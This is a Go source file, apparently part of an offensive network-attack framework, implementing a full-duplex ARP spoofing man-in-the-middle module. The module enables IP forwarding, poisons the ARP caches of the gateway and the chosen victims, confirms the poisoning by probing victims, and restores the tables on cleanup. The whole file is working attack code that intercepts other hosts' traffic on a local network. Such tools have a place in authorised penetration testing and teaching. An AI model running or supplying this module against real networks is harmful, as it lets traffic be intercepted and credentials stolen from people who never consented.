// Package mitm contains the L2/L3 man-in-the-middle modules: ARP spoofing,
// DNS/DHCP/NDP spoofing, ICMP redirects and WPAD poisoning.
package mitm

import (
	"fmt"
	"net"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/netx/arp"
	"github.com/qyvora/toha3ee/internal/safety"
	"github.com/qyvora/toha3ee/internal/store"
)

func init() {
	attacks.Register(&ARPSpoof{})
}

// ARPSpoof is the flagship full-duplex ARP man-in-the-middle module.
type ARPSpoof struct{}

// Meta implements attacks.Module.
func (*ARPSpoof) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "arp.spoof",
		Category:    "mitm",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"gateway", "host"},
		Requires:    []string{"cap.raw_socket", "cap.ip_forward"},
		Description: "full-duplex ARP spoofing between the gateway and victim hosts (traffic relays through this host)",
		Limitations: "networks with ARP spoofing protection (switches with ARP/DHCP snooping) overwrite poisoned entries; verify before relying on captured data",
	}
}

type arpRunState struct {
	spoof   *arp.Spoofer
	hb      *safety.Heartbeat
	restore func() error
	pairs   []arp.Pair
	arpSnap []arp.Row
}

// Preflight checks root, interface, gateway/targets and enables ip_forward.
func (*ARPSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}

	if err := safety.RequireRoot(); err != nil {
		rep.AddBlocked("root", err.Error())
	} else {
		rep.AddOK("root", "raw packet injection available")
	}

	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())

	gw, err := ctx.Iface.Gateway()
	if err != nil {
		rep.AddFixable("gateway", fmt.Sprintf("no default gateway: %v", err))
	} else {
		rep.AddOK("gateway", gw.String())
	}

	internal := ctx.Conf.GetBool("arp.spoof", "internal", false)
	if !internal {
		if err := safety.RequireRoot(); err == nil {
			restore, err := safety.EnableIPForward()
			if err != nil {
				rep.AddFixable("ip_forward", err.Error())
			} else {
				rep.AddFixed("ip_forward", "kernel forwarding enabled (restored on exit)")
				ctx.SetState("ip_forward_restore", restore)
			}
		}
	}

	_, targetErr := attacks.TargetsFromConfig(ctx, "arp.spoof", "targets", !internal)
	if targetErr != nil {
		rep.AddBlocked("targets", targetErr.Error())
	} else {
		rep.AddOK("targets", "target list resolved")
	}
	return rep, nil
}

// Run starts the poisoning loop and blocks until ctx.Done is closed.
func (m *ARPSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	internal := ctx.Conf.GetBool("arp.spoof", "internal", false)
	gw, _ := ctx.Iface.Gateway()

	pairs, err := m.buildPairs(ctx, gw, internal)
	if err != nil {
		return err
	}
	if len(pairs) == 0 {
		return fmt.Errorf("arp.spoof: no targets resolved; set arp.spoof.targets")
	}

	refresh := ctx.Conf.GetDuration("arp.spoof", "refresh", 2*time.Second)
	spoof, err := arp.NewSpoofer(ctx.Iface, pairs, refresh)
	if err != nil {
		return fmt.Errorf("arp.spoof: %w", err)
	}
	spoof.Start()

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("arp.spoof", hb)
	ctx.Safety.RegisterCleanup("arp.spoof", "restore ARP tables and ip_forward", m.makeCleanup(ctx))

	// Snapshot the kernel ARP table before poisoning so cleanup can restore
	// the victims' view even if the spoof loop missed a beat.
	snap, _ := arp.SnapshotTable()

	state := &arpRunState{spoof: spoof, hb: hb, pairs: pairs, arpSnap: snap}
	ctx.SetState("arp.spoof", state)

	ctx.Emit(events.TopicARPSpoofStarted, fmt.Sprintf("arp.spoof started: %d pair(s), internal=%v", len(pairs), internal), pairs)
	ctx.Printf("[*] arp.spoof running (fullduplex=%v, %d pairs). Ctrl-C or 'arp.spoof off' to restore.\n",
		!internal, len(pairs))

	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify proves the poison is live by probing each victim's ARP cache: we
// ask the victim who owns the gateway (or spoofed peer) IP and confirm it
// answers with our MAC.
func (m *ARPSpoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	st, ok := ctx.GetState("arp.spoof")
	if !ok {
		return nil, fmt.Errorf("arp.spoof not running")
	}
	state := st.(*arpRunState)

	poisoned, total := 0, 0
	for _, p := range state.pairs {
		total++
		vmac, _ := attacks.ResolveMAC(ctx, p.TargetIP, 2*time.Second)
		mac, err := arp.Probe(ctx.Iface, vmac, p.SpoofedIP, 3*time.Second)
		if err != nil {
			continue
		}
		if srcEqual(mac, ctx.Iface.MAC) {
			poisoned++
		}
	}

	imp := &attacks.Impact{}
	if poisoned == 0 {
		imp.Summary = fmt.Sprintf("attack likely failed — %d/%d victims confirmed poisoned (ARP protection likely active)", poisoned, total)
	} else {
		imp.Summary = fmt.Sprintf("%d/%d victims confirmed poisoned (their ARP cache points the spoofed IP at this host)", poisoned, total)
	}
	sent, _ := state.spoof.Stats()
	imp.Add("poisoned", fmt.Sprintf("%d", poisoned))
	imp.Add("total", fmt.Sprintf("%d", total))
	imp.Add("packets_sent", fmt.Sprintf("%d", sent))
	return imp, nil
}

// Cleanup stops poisoning and restores ARP tables and ip_forward.
func (m *ARPSpoof) Cleanup(ctx *attacks.AttackCtx) error {
	cleanup := m.makeCleanup(ctx)
	ctx.Safety.UnregisterCleanup("arp.spoof")
	ctx.Safety.UnregisterHeartbeat("arp.spoof")
	return cleanup()
}

func (m *ARPSpoof) makeCleanup(ctx *attacks.AttackCtx) func() error {
	return func() error {
		var errs []error
		if v, ok := ctx.GetState("arp.spoof"); ok {
			state := v.(*arpRunState)
			state.spoof.Stop()
			if err := state.spoof.Restore(); err != nil {
				errs = append(errs, err)
			}
			if len(state.arpSnap) > 0 {
				if err := arp.Restore(state.arpSnap); err != nil {
					errs = append(errs, err)
				}
			}
			ctx.Store.LogEvent(events.TopicARPSpoofStopped,
				fmt.Sprintf("arp.spoof stopped; %d pair(s) restored", len(state.pairs)))
		}
		if v, ok := ctx.GetState("ip_forward_restore"); ok {
			if fn, ok := v.(func() error); ok {
				if err := fn(); err != nil {
					errs = append(errs, err)
				}
			}
		}
		if len(errs) > 0 {
			return fmt.Errorf("cleanup partial: %v", errs)
		}
		return nil
	}
}

// buildPairs constructs the poison relationships for fullduplex or internal
// modes.
func (m *ARPSpoof) buildPairs(ctx *attacks.AttackCtx, gw net.IP, internal bool) ([]arp.Pair, error) {
	attackerMAC := ctx.Iface.MAC
	if internal {
		targets, err := attacks.TargetsFromConfig(ctx, "arp.spoof", "targets", true)
		if err != nil {
			return nil, err
		}
		if len(targets) < 2 {
			return nil, fmt.Errorf("internal mode needs at least 2 targets (use arp.spoof.targets 'IP1 IP2')")
		}
		a, b := targets[0], targets[1]
		return []arp.Pair{
			{TargetIP: a.IP, TargetMAC: a.MAC, SpoofedIP: b.IP, SpoofedMAC: attackerMAC, RealMAC: b.MAC},
			{TargetIP: b.IP, TargetMAC: b.MAC, SpoofedIP: a.IP, SpoofedMAC: attackerMAC, RealMAC: a.MAC},
		}, nil
	}

	gwMAC, err := attacks.ResolveMAC(ctx, gw, 3*time.Second)
	if err != nil {
		return nil, fmt.Errorf("resolve gateway MAC: %w", err)
	}
	targets, err := attacks.TargetsFromConfig(ctx, "arp.spoof", "targets", true)
	if err != nil {
		return nil, err
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("no targets; run net.scan first or set arp.spoof.targets")
	}

	var pairs []arp.Pair
	for _, t := range targets {
		vmac := t.MAC
		if vmac == nil {
			vmac, err = attacks.ResolveMAC(ctx, t.IP, 3*time.Second)
			if err != nil {
				continue
			}
		}
		pairs = append(pairs, arp.Pair{
			TargetIP: t.IP, TargetMAC: vmac, SpoofedIP: gw, SpoofedMAC: attackerMAC, RealMAC: gwMAC,
		})
		// Full duplex: also poison the gateway's view of the victim.
		pairs = append(pairs, arp.Pair{
			TargetIP: gw, TargetMAC: gwMAC, SpoofedIP: t.IP, SpoofedMAC: attackerMAC, RealMAC: vmac,
		})
	}
	return pairs, nil
}

func srcEqual(a, b net.HardwareAddr) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

var _ attacks.Module = (*ARPSpoof)(nil)
var _ = store.Host{}
